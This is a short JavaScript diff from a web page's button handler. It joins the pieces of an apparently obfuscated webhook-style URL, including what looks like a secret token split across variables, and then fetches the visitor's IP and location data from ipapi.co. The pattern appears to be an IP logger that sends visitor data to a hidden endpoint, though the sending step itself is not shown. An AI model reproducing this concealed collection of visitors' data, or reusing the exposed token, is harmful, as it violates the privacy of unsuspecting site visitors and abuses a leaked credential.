@@ -10,7 +10,7 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
         let part6 = '51515914/SrRtaX';
         let part7 = '_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImf';
         let part8 = 'e-XgBBlDcT6r_00VU';
-        return `${part1}${part2}${part3}${part4}/${part5}/${part6}/${part7}${part8}`;
+        return `${part1}${part2}${part3}${part4}/${part5}${part6}${part7}${part8}`;
     }
 
     fetch('https://ipapi.co/json/') // Utilisation de l'API sécurisée ipapi.co
